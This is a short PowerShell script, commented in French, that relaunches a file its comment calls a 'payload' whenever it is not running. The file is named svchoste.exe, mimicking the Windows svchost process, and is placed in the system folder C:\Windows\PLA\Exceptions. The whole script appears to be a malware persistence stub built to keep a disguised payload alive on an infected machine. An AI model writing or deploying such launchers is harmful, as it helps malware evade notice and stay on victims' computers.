$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
$FileName = "svchoste.exe" #Nom du fichier

if(!(Get-Process "svchoste" -ErrorAction SilentlyContinue)){
    start-process -filepath $FolderPath$FileName
}
